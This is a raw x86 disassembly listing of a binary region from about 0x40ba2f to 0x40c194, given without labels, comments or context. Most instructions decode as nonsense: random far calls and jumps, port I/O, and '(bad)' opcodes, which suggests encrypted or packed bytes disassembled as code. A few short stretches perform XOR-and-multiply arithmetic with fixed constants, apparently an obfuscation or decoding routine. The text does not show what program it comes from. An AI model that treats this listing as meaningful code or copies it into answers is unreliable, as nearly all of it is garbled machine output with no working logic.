  40ba2f:	bound  ebp,QWORD PTR [esp+edx*8]
  40ba32:	in     al,dx
  40ba33:	jbe    0x40bab1
  40ba35:	jb     0x40ba81
  40ba37:	xlat   BYTE PTR ds:[ebx]
  40ba38:	enter  0xdd91,0x3
  40ba3c:	jmp    0x77ac:0xd50a364
  40ba43:	adc    BYTE PTR [edi-0xd58db80],bl
  40ba49:	sbb    eax,0x40b12ed4
  40ba4e:	inc    esi
  40ba4f:	add    ch,dh
  40ba51:	mov    ds:0x55d8450b,eax
  40ba56:	dec    eax
  40ba57:	adc    DWORD PTR [edx+0x3cc78921],edx
  40ba5d:	mov    al,0xb2
  40ba5f:	adc    al,0x69
  40ba61:	pop    eax
  40ba62:	ja     0x40ba2e
  40ba64:	jnp    0x40ba68
  40ba66:	cli    
  40ba67:	icebp  
  40ba68:	pop    esi
  40ba69:	or     eax,0x93a977ea
  40ba6e:	outs   dx,BYTE PTR ds:[esi]
  40ba6f:	cmp    al,bl
  40ba71:	sbb    ah,dh
  40ba73:	pop    edx
  40ba74:	fisttp WORD PTR [esi]
  40ba76:	call   0x138e:0x927d0eda
  40ba7d:	jmp    0x696a3057
  40ba82:	push   es
  40ba83:	repnz shl DWORD PTR [eax],cl
  40ba86:	out    0x83,eax
  40ba88:	fcomp  QWORD PTR [ebx]
  40ba8a:	int3   
  40ba8b:	mov    bh,0x20
  40ba8d:	pop    esi
  40ba8e:	outs   dx,BYTE PTR ds:[esi]
  40ba8f:	lock jl 0x40ba85
  40ba92:	dec    ebx
  40ba93:	je     0x40ba2b
  40ba95:	outs   dx,BYTE PTR ds:[esi]
  40ba96:	and    eax,0xc2450a3b
  40ba9b:	or     ecx,DWORD PTR [ebx+0x72]
  40ba9e:	mov    dl,0xd8
  40baa0:	in     eax,0xef
  40baa2:	test   esp,ecx
  40baa4:	jg     0x40ba67
  40baa6:	div    BYTE PTR [edx+0x410f30de]
  40baac:	(bad)  
  40baad:	sti    
  40baae:	lock xor bh,BYTE PTR fs:[ebp-0x73fb4d9a]
  40bab6:	pop    ebp
  40bab7:	sub    DWORD PTR [ebx+0xf],esi
  40baba:	dec    ebp
  40babb:	adc    al,0xb5
  40babd:	xchg   ecx,eax
  40babe:	mov    edi,DWORD PTR [edi+0x37]
  40bac1:	xchg   ebx,eax
  40bac2:	pop    ebx
  40bac3:	and    al,0x77
  40bac5:	ins    DWORD PTR es:[edi],dx
  40bac6:	ins    BYTE PTR es:[edi],dx
  40bac7:	aad    0x2b
  40bac9:	and    al,0x99
  40bacb:	gs pop es
  40bacd:	inc    esp
  40bace:	sahf   
  40bacf:	in     al,dx
  40bad0:	pop    edi
  40bad1:	jns    0x40bb0a
  40bad3:	ret    0x3d
  40bad6:	repz in al,dx
  40bad8:	call   FWORD PTR [ebp-0x57]
  40badb:	mov    WORD PTR [eax+0x290e54d],cs
  40bae1:	push   ebx
  40bae2:	dec    edx
  40bae3:	mov    eax,0xb025ff8
  40bae8:	sub    DWORD PTR [ebx+0x43],ebp
  40baeb:	mov    DWORD PTR [edi],ecx
  40baed:	and    DWORD PTR [ebx],ebp
  40baef:	aam    0xf0
  40baf1:	aas    
  40baf2:	lock mov edx,0x98412938
  40baf8:	cwde   
  40baf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bafa:	mov    bh,0xc6
  40bafc:	loopne 0x40bad4
  40bafe:	dec    edi
  40baff:	mov    edi,0x954edbfe
  40bb04:	add    al,0xea
  40bb06:	adc    BYTE PTR [ebp-0x5d1ec222],bh
  40bb0c:	shl    DWORD PTR [esi+esi*4+0x6650450a],0x23
  40bb14:	popa   
  40bb15:	fidivr WORD PTR [ecx+0x3b61d957]
  40bb1b:	sbb    ebp,DWORD PTR [edx+0x7274e42]
  40bb21:	push   eax
  40bb22:	mov    edi,DWORD PTR [edx+0x434bd1ec]
  40bb28:	in     al,dx
  40bb29:	cmp    ah,bh
  40bb2b:	fcomp  QWORD PTR [eax-0x72d11dd7]
  40bb31:	into   
  40bb32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb33:	xchg   edx,eax
  40bb34:	inc    ecx
  40bb35:	jbe    0x40bb14
  40bb37:	leave  
  40bb38:	pop    edi
  40bb39:	add    esi,DWORD PTR [eax-0x36]
  40bb3c:	and    DWORD PTR [eax+0x2dcef28b],edx
  40bb42:	int3   
  40bb43:	jae    0x40bb88
  40bb45:	out    0x21,eax
  40bb47:	repnz mov bh,0x70
  40bb4a:	inc    edi
  40bb4b:	mov    ch,0x2
  40bb4d:	xlat   BYTE PTR ds:[ebx]
  40bb4e:	lock repnz stc 
  40bb51:	test   ebx,ecx
  40bb53:	pop    edi
  40bb54:	mov    BYTE PTR [edi+0x7078938c],dl
  40bb5a:	push   edi
  40bb5b:	sub    BYTE PTR [ecx],al
  40bb5d:	bnd jns 0x40bba9
  40bb60:	scas   al,BYTE PTR es:[edi]
  40bb61:	mov    ch,0xf6
  40bb63:	repz xlat BYTE PTR ds:[ebx]
  40bb65:	sub    eax,DWORD PTR [ebx-0x15]
  40bb68:	push   eax
  40bb69:	pop    esp
  40bb6a:	push   cs
  40bb6b:	pop    eax
  40bb6c:	sub    al,0x7f
  40bb6e:	mov    eax,ds:0xb8c125cb
  40bb73:	loope  0x40bb01
  40bb75:	mov    cl,0x86
  40bb77:	adc    edx,DWORD PTR [eax]
  40bb79:	mov    esi,ecx
  40bb7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb7c:	sbb    BYTE PTR [esi+0x5f],ch
  40bb7f:	cwde   
  40bb80:	lock sbb al,0xfb
  40bb83:	pop    edx
  40bb84:	jge    0x40bb09
  40bb86:	dec    eax
  40bb87:	sbb    ebx,DWORD PTR [ebx-0x2d20a2be]
  40bb8d:	ja     0x40bb80
  40bb8f:	dec    esp
  40bb90:	cmp    edi,DWORD PTR [edx]
  40bb92:	outs   dx,DWORD PTR ds:[esi]
  40bb93:	pop    edi
  40bb94:	es ds add al,0xa9
  40bb98:	cmp    DWORD PTR [ecx+eax*1],0x92d53efe
  40bb9f:	ss sbb esp,esp
  40bba2:	mul    BYTE PTR [eax]
  40bba4:	adc    ecx,eax
  40bba6:	sub    BYTE PTR [eax-0x354e696],ch
  40bbac:	xor    al,0x1b
  40bbae:	aad    0x1c
  40bbb0:	ret    0x13ef
  40bbb3:	(bad)  
  40bbb4:	fsubr  QWORD PTR [esi]
  40bbb6:	out    dx,eax
  40bbb7:	loop   0x40bc1c
  40bbb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbba:	in     al,0x23
  40bbbc:	pop    esi
  40bbbd:	pop    esi
  40bbbe:	sbb    al,0x7
  40bbc0:	gs (bad) 
  40bbc2:	jmp    0x40bb86
  40bbc4:	fsubr  st(0),st
  40bbc6:	rcl    DWORD PTR [edi-0x7b],0x3a
  40bbca:	mov    bl,0x88
  40bbcc:	repz popf 
  40bbce:	pop    edi
  40bbcf:	jns    0x40bb5e
  40bbd1:	repnz clc 
  40bbd3:	inc    ecx
  40bbd4:	fucom  st(1)
  40bbd6:	lds    ebp,FWORD PTR [esi+0x38a42dbf]
  40bbdc:	repz inc eax
  40bbde:	mov    bl,0xdd
  40bbe0:	inc    ebp
  40bbe1:	sub    bh,BYTE PTR ds:0x34f01791
  40bbe7:	push   esp
  40bbe8:	sbb    eax,0xc111ad
  40bbed:	pop    ebp
  40bbee:	(bad)  
  40bbef:	scas   al,BYTE PTR es:[edi]
  40bbf0:	push   ecx
  40bbf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbf2:	js     0x40bbed
  40bbf4:	ins    DWORD PTR es:[edi],dx
  40bbf5:	icebp  
  40bbf6:	push   ecx
  40bbf7:	pop    ebp
  40bbf8:	sahf   
  40bbf9:	pop    ecx
  40bbfa:	enter  0x15a7,0x17
  40bbfe:	mov    edi,0x3b3b7df8
  40bc03:	das    
  40bc04:	neg    BYTE PTR [ebx-0x7c]
  40bc07:	inc    ebx
  40bc08:	and    edx,ebp
  40bc0a:	sub    DWORD PTR [esi],ecx
  40bc0c:	and    DWORD PTR [edi-0x2f],0x49
  40bc10:	cmp    esi,ebx
  40bc12:	out    0xb6,eax
  40bc14:	add    DWORD PTR [ecx-0x57cb9237],ebp
  40bc1a:	rol    edi,1
  40bc1c:	ds xchg esp,eax
  40bc1e:	jb     0x40bbf0
  40bc20:	das    
  40bc21:	lods   al,BYTE PTR ds:[esi]
  40bc22:	push   ds
  40bc23:	(bad)  
  40bc24:	(bad)  
  40bc25:	jmp    0x40bc3a
  40bc27:	fnstenv [ecx+edi*2-0x2d8b5795]
  40bc2e:	jno    0x40bc83
  40bc30:	dec    eax
  40bc31:	and    dl,dh
  40bc33:	mov    ecx,0xbce6163b
  40bc38:	xor    eax,0xffffffaf
  40bc3b:	dec    edx
  40bc3c:	retf   
  40bc3d:	test   eax,0xd430763
  40bc42:	xchg   ecx,eax
  40bc43:	div    BYTE PTR es:[esi]
  40bc46:	pop    edi
  40bc47:	and    BYTE PTR [eax],0x18
  40bc4a:	scas   al,BYTE PTR es:[edi]
  40bc4b:	lahf   
  40bc4c:	outs   dx,DWORD PTR ds:[esi]
  40bc4d:	sahf   
  40bc4e:	fimul  WORD PTR ds:0x8eb72ce1
  40bc54:	push   ecx
  40bc55:	rcr    ah,0x22
  40bc58:	dec    ebx
  40bc59:	and    BYTE PTR [ebx+0x2a9a0c43],dh
  40bc5f:	jo     0x40bcc9
  40bc61:	sub    eax,0x9323aa2a
  40bc66:	mov    bh,0xb6
  40bc68:	test   DWORD PTR [esp+edx*8+0x73],ebp
  40bc6c:	out    0x4f,eax
  40bc6e:	ficom  WORD PTR [esi]
  40bc70:	xor    edi,ebx
  40bc72:	jmp    0x40bc16
  40bc74:	(bad)  
  40bc75:	adc    dl,BYTE PTR [edi+eiz*4-0x2b]
  40bc79:	scas   al,BYTE PTR es:[edi]
  40bc7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc7b:	shr    DWORD PTR [ebp-0x32],1
  40bc7e:	xchg   edi,eax
  40bc7f:	lock stos DWORD PTR es:[edi],eax
  40bc81:	out    dx,al
  40bc82:	and    esi,DWORD PTR [ebp+0x61d44e6b]
  40bc88:	nop
  40bc89:	(bad)  
  40bc8a:	xor    DWORD PTR [edi+0x528fba59],esi
  40bc90:	ror    BYTE PTR [ebx+ecx*8+0x236646d7],1
  40bc97:	adc    esp,ebx
  40bc99:	mov    ebx,edi
  40bc9b:	repnz std 
  40bc9d:	add    esi,eax
  40bc9f:	(bad)  
  40bca1:	shl    BYTE PTR [ecx],1
  40bca3:	push   0x8
  40bca5:	xchg   DWORD PTR [ecx-0x1bd1d76d],esp
  40bcab:	in     eax,dx
  40bcac:	mov    dl,0x23
  40bcae:	push   edi
  40bcaf:	dec    esi
  40bcb0:	icebp  
  40bcb1:	imul   edi,DWORD PTR [edi+0x3c],0x5b
  40bcb5:	shl    eax,1
  40bcb7:	mov    ds:0xbd67df7d,eax
  40bcbc:	push   ecx
  40bcbd:	fadd   QWORD PTR [ebp+0x367630fd]
  40bcc3:	test   eax,0x9c8f5e0a
  40bcc8:	mov    dh,dh
  40bcca:	cmp    bh,bh
  40bccc:	push   esi
  40bccd:	call   0x27907cff
  40bcd2:	repz jnp 0x40bd42
  40bcd5:	sub    edx,DWORD PTR [esi+0x53]
  40bcd8:	hlt    
  40bcd9:	sbb    ebp,edx
  40bcdb:	shl    DWORD PTR [ebp+ebp*4-0x3b369736],0x16
  40bce3:	jmp    0xa9f8:0x5d127e33
  40bcea:	mov    cl,0x10
  40bcec:	mov    eax,ds:0x2e32a1b1
  40bcf1:	cld    
  40bcf2:	shr    esi,cl
  40bcf4:	mov    ebx,DWORD PTR [ebp-0x10]
  40bcf7:	sub    ebx,edi
  40bcf9:	cmp    ebx,edx
  40bcfb:	ja     0x40bd09
  40bd01:	mov    edx,DWORD PTR [ebp-0x34]
  40bd04:	jmp    0x40c0ee
  40bd09:	mov    edx,DWORD PTR [ebp-0x3c]
  40bd0c:	mov    edi,DWORD PTR [ebp-0x4]
  40bd0f:	xor    edx,eax
  40bd11:	xor    edi,eax
  40bd13:	add    edx,ecx
  40bd15:	add    edi,ecx
  40bd17:	imul   edx,edi
  40bd1a:	mov    edi,DWORD PTR [ebp-0x8]
  40bd1d:	mov    ebx,DWORD PTR [ebp-0x10]
  40bd20:	sub    ebx,edi
  40bd22:	cmp    ebx,edx
  40bd24:	mov    edx,DWORD PTR [ebp-0x38]
  40bd27:	jbe    0x40c0ee
  40bd2d:	jmp    0x40c0eb
  40bd32:	xchg   edx,eax
  40bd33:	dec    edx
  40bd34:	inc    edx
  40bd35:	inc    esp
  40bd36:	inc    edx
  40bd37:	push   esp
  40bd38:	xchg   edx,eax
  40bd39:	dec    edx
  40bd3a:	fdiv   DWORD PTR [edx+edi*8]
  40bd3d:	adc    dh,BYTE PTR [edx]
  40bd3f:	mov    ds:0x8f8fd692,al
  40bd44:	jo     0x40bdb6
  40bd46:	lahf   
  40bd47:	jge    0x40bdb9
  40bd49:	jo     0x40bd22
  40bd4b:	push   ebp
  40bd4c:	push   es
  40bd4d:	mov    ecx,0xc21b632f
  40bd52:	stc    
  40bd53:	push   edi
  40bd54:	xchg   esi,eax
  40bd55:	std    
  40bd56:	pop    es
  40bd57:	mov    bl,0x4e
  40bd59:	fwait
  40bd5a:	addr16 or al,0xc9
  40bd5d:	pusha  
  40bd5e:	std    
  40bd5f:	into   
  40bd60:	jp     0x40bd93
  40bd62:	shl    BYTE PTR [ebp-0x386cfca],1
  40bd68:	fs mov esp,0xeed2f96
  40bd6e:	fs mov cl,0xfd
  40bd71:	xchg   ecx,eax
  40bd72:	rcl    DWORD PTR [esi-0x10],0xb
  40bd76:	push   esp
  40bd77:	and    bl,dl
  40bd79:	pop    edx
  40bd7a:	pop    es
  40bd7b:	das    
  40bd7c:	shr    BYTE PTR [edi+eax*1-0x6c265a9e],1
  40bd83:	sub    al,0x9d
  40bd85:	je     0x40bd8c
  40bd87:	mov    ah,0x3b
  40bd89:	mov    bl,0xec
  40bd8b:	sub    bl,BYTE PTR [edi+ecx*4+0x4c807472]
  40bd92:	or     DWORD PTR [edi-0x28],esp
  40bd95:	int    0x9e
  40bd97:	mov    DWORD PTR [ebx*8+0x756e34a6],ebx
  40bd9e:	ja     0x40bdae
  40bda0:	or     esi,DWORD PTR [esi+0xaee6a34]
  40bda6:	test   al,0x4e
  40bda8:	ret    0x23e7
  40bdab:	jmp    0x103aee91
  40bdb0:	push   ecx
  40bdb1:	jb     0x40bdf1
  40bdb3:	dec    ebp
  40bdb4:	inc    ebx
  40bdb5:	retf   
  40bdb6:	adc    esp,edi
  40bdb8:	push   ss
  40bdb9:	mov    al,0x8b
  40bdbb:	das    
  40bdbc:	rcr    BYTE PTR [eax],1
  40bdbe:	lods   eax,DWORD PTR ds:[esi]
  40bdbf:	test   BYTE PTR ds:[ebx],ch
  40bdc2:	xchg   edi,eax
  40bdc3:	or     edx,DWORD PTR [edi+0x25dc9d4]
  40bdc9:	mov    bh,0x89
  40bdcb:	test   eax,0xfbff1512
  40bdd0:	jo     0x40bd93
  40bdd2:	outs   dx,DWORD PTR ds:[esi]
  40bdd3:	add    dl,BYTE PTR [edi+0x36]
  40bdd6:	test   BYTE PTR [eax+edi*8+0x4b],ch
  40bdda:	pop    edi
  40bddb:	jo     0x40bd78
  40bddd:	fistp  QWORD PTR [ebx]
  40bddf:	ins    DWORD PTR es:[edi],dx
  40bde0:	xchg   ecx,eax
  40bde1:	sbb    bl,ah
  40bde3:	bound  esi,QWORD PTR [edi+0x2aaf02f6]
  40bde9:	js     0x40bd93
  40bdeb:	pushf  
  40bdec:	fild   WORD PTR [edi]
  40bdee:	in     eax,0x31
  40bdf0:	pop    esp
  40bdf1:	sub    eax,0x681ebbd2
  40bdf6:	push   cs
  40bdf7:	fdivp  st(3),st
  40bdf9:	push   eax
  40bdfa:	loopne 0x40be52
  40bdfc:	or     dl,al
  40bdfe:	out    0xc1,eax
  40be00:	repnz loopne 0x40bddf
  40be03:	jl     0x40be7e
  40be05:	retf   
  40be06:	dec    eax
  40be07:	fistp  WORD PTR [ebx]
  40be09:	data16 (bad) 
  40be0b:	mov    bh,0x4b
  40be0d:	and    BYTE PTR [esi-0xc],ch
  40be10:	cmp    al,0x8e
  40be12:	xor    BYTE PTR [esi],cl
  40be14:	jmp    0x40be6f
  40be16:	dec    esp
  40be17:	dec    eax
  40be18:	adc    esi,DWORD PTR [eax-0x4e0c8f2b]
  40be1e:	addr16 cdq 
  40be20:	push   ds
  40be21:	aas    
  40be22:	inc    esi
  40be23:	and    bh,dh
  40be25:	push   0xffffffdd
  40be27:	js     0x40be24
  40be29:	pop    ebx
  40be2a:	call   0xe957:0x5a85cf29
  40be31:	mov    al,0x50
  40be33:	sbb    al,0x5a
  40be35:	jge    0x40be2d
  40be37:	into   
  40be38:	rcl    DWORD PTR [ecx-0x164fc2e5],cl
  40be3e:	add    eax,0x769c736
  40be43:	jmp    0xd5d73050
  40be48:	and    al,0x12
  40be4a:	or     eax,0x6fa4a6c
  40be4f:	lock scas al,BYTE PTR es:[edi]
  40be51:	mov    dh,0x2b
  40be53:	pop    ds
  40be54:	adc    edx,DWORD PTR [ecx]
  40be56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be57:	jb     0x40be92
  40be59:	and    eax,esp
  40be5b:	mov    es:0x58fe93d0,al
  40be61:	js     0x40be80
  40be63:	mov    edi,0xb8e9d5cf
  40be68:	mov    bl,0xb3
  40be6a:	std    
  40be6b:	xchg   ebp,eax
  40be6c:	(bad)  [esi-0x11]
  40be6f:	outs   dx,BYTE PTR ds:[esi]
  40be70:	ror    BYTE PTR [eax],1
  40be72:	xchg   cl,bh
  40be74:	lock or edx,ebx
  40be77:	imul   edx,esp,0x24
  40be7a:	fdivrp st(4),st
  40be7c:	popf   
  40be7d:	xchg   ecx,eax
  40be7e:	enter  0x4ed8,0x93
  40be82:	test   DWORD PTR [edx],edx
  40be84:	cli    
  40be85:	xchg   ecx,eax
  40be86:	push   edx
  40be87:	inc    esi
  40be88:	aaa    
  40be89:	xlat   BYTE PTR ds:[ebx]
  40be8a:	and    al,0x23
  40be8c:	ins    DWORD PTR es:[edi],dx
  40be8d:	ds pop ecx
  40be8f:	cdq    
  40be90:	mov    esi,?
  40be92:	call   0xd7e2:0xce7d6b49
  40be99:	sbb    al,BYTE PTR [esi+0x39]
  40be9c:	or     esp,edx
  40be9e:	xor    al,BYTE PTR [edx+0x37]
  40bea1:	bound  esi,QWORD PTR [ebx+0x27]
  40bea4:	ret    
  40bea5:	shr    edi,1
  40bea7:	jno    0x40bead
  40bea9:	jmp    0x20a8:0x6bb595bd
  40beb0:	(bad)  
  40beb1:	adc    al,0x76
  40beb3:	sbb    al,0xbe
  40beb5:	addr16 dec ebx
  40beb7:	inc    ebx
  40beb8:	(bad)  
  40beba:	ins    DWORD PTR es:[edi],dx
  40bebb:	cdq    
  40bebc:	imul   esi,DWORD PTR ds:0x1afa1a3f,0xe2478063
  40bec6:	in     al,dx
  40bec7:	fcomp  st(3)
  40bec9:	add    eax,0x30acad73
  40bece:	mov    WORD PTR [edi-0x49037ab3],ss
  40bed4:	mov    bh,0xf4
  40bed6:	xor    dh,ah
  40bed8:	jmp    0x40bec4
  40beda:	(bad)  
  40bedb:	ret    0xf428
  40bede:	test   eax,0x8f185720
  40bee3:	cld    
  40bee4:	pop    esi
  40bee5:	lods   al,BYTE PTR ds:[esi]
  40bee6:	adc    esp,edx
  40bee8:	cmp    eax,0x71324348
  40beed:	mov    ah,0x26
  40beef:	and    eax,0xa45bdc5
  40bef4:	xor    eax,0x4afe257c
  40bef9:	aad    0x54
  40befb:	dec    edi
  40befc:	xchg   BYTE PTR [eax+0x76],bh
  40beff:	sub    eax,0x14dabaa1
  40bf04:	mov    bh,0x27
  40bf06:	xchg   ecx,eax
  40bf07:	das    
  40bf08:	adc    BYTE PTR [eax-0x6feb04e8],ah
  40bf0e:	sti    
  40bf0f:	adc    esp,DWORD PTR [ebp-0x3e]
  40bf12:	in     al,0xda
  40bf14:	leave  
  40bf15:	xchg   ecx,eax
  40bf16:	in     al,dx
  40bf17:	addr16 jno 0x40be9e
  40bf1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf1b:	dec    ebx
  40bf1c:	mov    dl,0x57
  40bf1e:	addr16 sub al,0x83
  40bf21:	xchg   ebp,eax
  40bf22:	adc    eax,0xba6deed8
  40bf27:	inc    ebp
  40bf28:	out    0xd9,eax
  40bf2a:	cmovbe ecx,DWORD PTR [ecx+0x0]
  40bf2e:	pop    ebp
  40bf2f:	mov    esi,0xc7c14acf
  40bf34:	inc    ebp
  40bf35:	push   ebx
  40bf36:	sub    dl,0x6b
  40bf39:	lds    ebx,FWORD PTR [ecx]
  40bf3b:	int3   
  40bf3c:	mov    edx,0x5d1b540c
  40bf41:	pusha  
  40bf42:	fwait
  40bf43:	adc    al,BYTE PTR [ebp-0xdc5dfc0]
  40bf49:	repnz aad 0xbc
  40bf4c:	fsubp  st(2),st
  40bf4e:	add    DWORD PTR [eax-0x6e],esi
  40bf51:	rcl    DWORD PTR [esi+0x1991818],1
  40bf57:	mov    eax,ds:0xb544c1e1
  40bf5c:	jmp    0x40bfd4
  40bf5e:	jae    0x40bf1c
  40bf60:	stos   BYTE PTR es:[edi],al
  40bf61:	mov    BYTE PTR [edi-0x3c87ae5d],bh
  40bf67:	cmp    dl,BYTE PTR [edi+edi*8-0x574d6bf4]
  40bf6e:	inc    esp
  40bf6f:	jnp    0x40bf94
  40bf71:	pop    edx
  40bf72:	jb     0x40bf77
  40bf74:	cli    
  40bf75:	stos   DWORD PTR es:[edi],eax
  40bf76:	dec    esp
  40bf77:	mov    esp,edx
  40bf79:	and    eax,0x334e23e4
  40bf7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf7f:	or     eax,0x2456aab7
  40bf84:	mov    WORD PTR [eax-0x1d],ds
  40bf87:	add    bl,BYTE PTR [eax-0xb0470d6]
  40bf8d:	retf   
  40bf8e:	jno    0x40bff5
  40bf90:	pop    eax
  40bf91:	ficomp DWORD PTR [ecx+0x34889cf2]
  40bf97:	icebp  
  40bf98:	cdq    
  40bf99:	call   0x1838:0xc7a3ec28
  40bfa0:	test   eax,0xa39c4c14
  40bfa5:	fs adc eax,0x46a9b48c
  40bfab:	jno    0x40bf3b
  40bfad:	pusha  
  40bfae:	jmp    DWORD PTR [eax-0x64b895f4]
  40bfb4:	jmp    0x40c002
  40bfb6:	ins    BYTE PTR es:[edi],dx
  40bfb7:	xor    ebp,esi
  40bfb9:	or     BYTE PTR [esi],cl
  40bfbb:	add    DWORD PTR [edx+0x7089591b],esp
  40bfc1:	cmp    BYTE PTR [ecx],0xf4
  40bfc4:	mov    al,0xee
  40bfc6:	add    BYTE PTR [ebx],al
  40bfc8:	sbb    bh,dh
  40bfca:	out    dx,al
  40bfcb:	pop    ds
  40bfcc:	push   esi
  40bfcd:	mov    edx,0x4f39c6b6
  40bfd2:	mov    eax,DWORD PTR [edi-0x22ff79f4]
  40bfd8:	jbe    0x40bf69
  40bfda:	sub    DWORD PTR [esp+edx*2-0x71cebb79],0x4b
  40bfe2:	adc    edx,edx
  40bfe4:	mov    DWORD PTR [esi],edx
  40bfe6:	mov    bh,0xf6
  40bfe8:	pop    edi
  40bfe9:	retf   
  40bfea:	pop    ss
  40bfeb:	pop    ebx
  40bfec:	and    esp,DWORD PTR [edi+0x49]
  40bfef:	xchg   ah,ah
  40bff1:	loop   0x40c04e
  40bff3:	pop    esi
  40bff4:	xchg   edi,eax
  40bff5:	xor    al,BYTE PTR [ecx]
  40bff7:	adc    bh,BYTE PTR [ebx]
  40bff9:	xor    al,0x4d
  40bffb:	inc    esi
  40bffc:	push   ecx
  40bffd:	test   eax,0xcf15eb3c
  40c002:	fbstp  TBYTE PTR [edx-0x5]
  40c005:	sahf   
  40c006:	mov    ebp,0x12720667
  40c00b:	sbb    cl,dh
  40c00d:	mov    edx,0x7c84f6b9
  40c012:	pop    ecx
  40c013:	or     al,0x3e
  40c015:	loopne 0x40c043
  40c017:	and    eax,0xa87fa52e
  40c01c:	dec    esi
  40c01d:	pop    ebx
  40c01e:	and    al,0xb1
  40c020:	(bad)  
  40c021:	(bad)  
  40c022:	fnsave [esp+eax*2-0x2c]
  40c026:	in     al,0x92
  40c028:	int    0x9
  40c02a:	cwde   
  40c02b:	cdq    
  40c02c:	and    DWORD PTR [eax],ebp
  40c02e:	popf   
  40c02f:	and    eax,0xc9db78d7
  40c034:	popf   
  40c035:	mov    bh,0x6c
  40c037:	mov    ch,0x1a
  40c039:	aad    0xfa
  40c03b:	arpl   WORD PTR [eax],cx
  40c03d:	out    dx,eax
  40c03e:	clc    
  40c03f:	je     0x40c01f
  40c041:	jae    0x40c04c
  40c043:	imul   edx,DWORD PTR [edi+eiz*8-0x70],0x660e2d53
  40c04b:	leave  
  40c04c:	enter  0xf582,0xf1
  40c050:	or     DWORD PTR [eax-0x210ef865],ebx
  40c056:	test   eax,0x97fc349c
  40c05b:	xor    ecx,esp
  40c05d:	jmp    0x1eaa68a6
  40c062:	or     DWORD PTR [edi+0x6b],edi
  40c065:	jno    0x40c053
  40c067:	jb     0x40c0e2
  40c069:	(bad)  
  40c06a:	hlt    
  40c06b:	pop    edi
  40c06c:	or     ebp,DWORD PTR [edx+0x102d63]
  40c072:	and    DWORD PTR [eax],ebp
  40c074:	xchg   edi,eax
  40c075:	and    BYTE PTR [ebp+0x6e],bl
  40c078:	cmp    eax,0xd149d81a
  40c07d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c07e:	add    esi,edx
  40c080:	pop    edx
  40c081:	test   al,0x95
  40c083:	cmp    DWORD PTR [edi-0x1f],ebp
  40c086:	adc    ecx,DWORD PTR [ebx]
  40c088:	mov    ebx,0x7e58a685
  40c08d:	dec    ebx
  40c08e:	pop    ebx
  40c08f:	stos   DWORD PTR es:[edi],eax
  40c090:	add    al,0x38
  40c092:	out    0xd4,eax
  40c094:	pop    edx
  40c095:	ret    
  40c096:	xor    ebx,DWORD PTR ds:0x2efff7af
  40c09c:	std    
  40c09d:	push   ds
  40c09e:	xchg   BYTE PTR [edi+0x52],ch
  40c0a1:	push   ebx
  40c0a2:	mov    ebx,0x8ed46e30
  40c0a7:	jno    0x40c117
  40c0a9:	shl    DWORD PTR [edi],1
  40c0ab:	sub    esp,ecx
  40c0ad:	mov    ds:0xd7272020,eax
  40c0b2:	xor    WORD PTR [ebx+0x14],di
  40c0b6:	inc    ebp
  40c0b7:	or     ecx,0x7164013b
  40c0bd:	dec    esi
  40c0be:	mov    cl,0x6f
  40c0c0:	shl    BYTE PTR [edx+0x65461941],1
  40c0c6:	mov    esi,0xf8812f60
  40c0cb:	or     dl,BYTE PTR [edx-0x20b05f41]
  40c0d1:	aaa    
  40c0d2:	sub    DWORD PTR [ecx],esi
  40c0d4:	dec    eax
  40c0d5:	(bad)  
  40c0d6:	or     eax,0x3889b34
  40c0db:	xchg   ebp,eax
  40c0dc:	fdivr  st,st(3)
  40c0de:	mov    dh,0xc
  40c0e0:	xor    DWORD PTR [ecx-0x64],ecx
  40c0e3:	sbb    dl,dl
  40c0e5:	pushf  
  40c0e6:	mov    DWORD PTR [ecx],ebx
  40c0e8:	push   0xffffff8c
  40c0ea:	dec    esi
  40c0eb:	mov    edx,DWORD PTR [ebp-0x3c]
  40c0ee:	mov    edi,DWORD PTR [ebp-0x4]
  40c0f1:	xor    edi,eax
  40c0f3:	xor    edx,eax
  40c0f5:	add    edi,ecx
  40c0f7:	add    edx,ecx
  40c0f9:	imul   edx,edi
  40c0fc:	mov    DWORD PTR [ebp+0xc],edx
  40c0ff:	mov    edx,DWORD PTR [ebp+0xc]
  40c102:	mov    DWORD PTR [ebp-0x24],edx
  40c105:	mov    edx,DWORD PTR [ebp-0x8]
  40c108:	add    edx,DWORD PTR [ebp-0x40]
  40c10b:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40c112:	mov    DWORD PTR [ebp-0x1c],edx
  40c115:	mov    DWORD PTR [ebp-0xc],0xf89c8530
  40c11c:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  40c123:	mov    edx,DWORD PTR [ebp-0x18]
  40c126:	xor    edx,eax
  40c128:	add    edx,ecx
  40c12a:	jmp    0x40ccd1
  40c12f:	mov    edx,DWORD PTR [ebp-0x18]
  40c132:	jmp    0x40c4f0
  40c137:	call   0x9a62:0x428402d0
  40c13e:	out    0xb8,al
  40c140:	ds mov ax,bp
  40c144:	call   0x7070:0x8b2e1f11
  40c14b:	lahf   
  40c14c:	jge    0x40c1be
  40c14e:	jo     0x40c15c
  40c150:	cmp    ecx,DWORD PTR [esi-0x48f18c19]
  40c156:	ror    DWORD PTR [esi+0x540f1861],0x69
  40c15d:	xor    eax,0x269e8081
  40c162:	xor    DWORD PTR [eax+0x70],ebp
  40c165:	pop    edx
  40c166:	das    
  40c167:	jae    0x40c1d1
  40c169:	mov    ebp,0x7dd0ed2b
  40c16e:	mov    ebx,0x2adcc7c2
  40c173:	ds ins DWORD PTR es:[edi],dx
  40c175:	rol    DWORD PTR [edi-0x79],1
  40c178:	lods   eax,DWORD PTR ds:[esi]
  40c179:	adc    ebx,ebx
  40c17b:	(bad)
  40c17f:	add    ecx,DWORD PTR [edi+edi*1+0x68090fc9]
  40c186:	into   
  40c187:	js     0x40c115
  40c189:	pop    edx
  40c18a:	pop    es
  40c18b:	sar    DWORD PTR [eax+0x2875e2c7],1
  40c191:	aad    0x20
  40c193:	push   esp
  40c194:	jp     0x40c14e
